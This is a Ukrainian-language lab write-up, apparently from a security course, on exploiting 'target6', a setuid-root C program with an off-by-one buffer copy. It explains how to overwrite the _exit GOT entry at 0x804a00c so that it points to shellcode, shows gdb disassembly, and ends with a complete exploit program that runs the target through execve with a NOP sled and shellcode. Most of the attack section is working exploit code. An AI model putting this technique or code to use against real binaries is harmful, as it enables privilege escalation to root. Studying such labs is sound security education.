# Global offset table

target6:

```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}
 


void foo(char *argv[])
{
  int *p;
  int a = 0;
  p = &a;

  bar(argv[1]);

  *p = a;

  _exit(0);
  /* not reached */
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target6: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```

Загальна структура цього експерименту аналогічна структурі 2 лабораторної, але різниця полягає в додаванні змінної-покажчика p і константи a в функцію foo \(\), різниця полягає в тому що в foo \_exit \(0\) викликається в кінці, тому навіть якщо адрес повернення змінений, ми не зможемо це використати. Адреса покажчика p знаходиться в ebp + 4, а адреса змінної a розташований в ebp + 8. Придивившись до функції foo: після виклику функції виконується \* p = a, тобто вміст покажчика змінюється. Якщо ми взнаємо адресу \_exit та змінимо адрес \_exit на адресу шелл-коду, ми зможемо перейти в оболонку. Спочатку дизасемблюємо функцію foo:

```bash
(gdb) disass foo 

   0x0804855d <+0>: push% ebp 
   0x0804855e <+1>: mov% esp,% ebp 
   0x08048560 <+3>: sub $ 0x8,% esp 
   0x08048563 < +6>: movl $ 0x0, -0x8 (% ebp) 
   0x0804856a <+13>: lea -0x8 (% ebp),% eax 
   0x0804856d <+16>: mov% eax, -0x4 (% ebp) 
   0x08048570 <+19 >: mov 0x8 (% ebp),% eax 
   0x08048573 <+22>: add $ 0x4,% eax 
   0x08048576 <+25>: mov (% eax),% eax 
   0x08048578 <+27>: push% eax 
   0x08048579 <+28 >: call 0x804853a <bar> 
   0x0804857e <+33>: add $ 0x4,% esp 
   0x08048581 <+36>: mov -0x8 (% ebp),% edx 
   0x08048584 <+39>:mov -0x4 (% ebp),% eax
   0x08048587 <+42>: mov% edx, (% eax) 
   0x08048589 <+44>: push $ 0x0 
 =>0x0804858b <+46>: call 0x8048380 <_exit @ plt>
```

Ми бачимо, що \_exit \(\) знаходиться за адресою 0x8048380 Дизасемблювавши код з цієї адреси ми бачимо, що виконується jmp інструкція на адресу, що знаходиться у вказівнику.

```bash
(gdb) disass 0x8048380
Dump of assembler code for function _exit@plt:
   0x08048380 <+0>: jmp    *0x804a00c
   0x08048386 <+6>: push   $0x0
   0x0804838b <+11>:  jmp    0x8048370
End of assembler dump.
```

Отже, ми повинні змінити \_exit на адресу потрібного нам шеллкода. Те, що нам потрібно зробити це:

```text
* (int *) (0x804a00c) = 0xbffffcc0
```

Процес переповнення відбувається наступним чином:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  int offset = 0xbffffd00 - 0xbffffcc0;
  *(int *) (sploitstring + offset - 4) = 0x0804a00c;
  *(int *) (sploitstring + offset - 8) = 0xbffffcc0;

  memcpy(sploitstring, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

